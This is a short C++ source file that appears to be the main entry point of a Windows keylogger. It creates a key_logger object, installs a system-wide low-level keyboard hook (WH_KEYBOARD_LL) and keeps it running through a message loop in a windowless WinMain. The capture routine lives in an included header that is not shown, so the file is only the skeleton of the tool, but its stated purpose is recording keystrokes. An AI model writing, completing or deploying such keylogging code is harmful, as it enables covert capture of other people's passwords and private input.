#include <iostream>
#include <windows.h>

#include "../Include/Error_Logger/Error_Logger.h"
//#include <Error_Logger.h>
#include "../Include/KeyLogger/KeyLogger.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
    key_logger key_log( WH_KEYBOARD_LL );
    key_log.set_hook();

    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}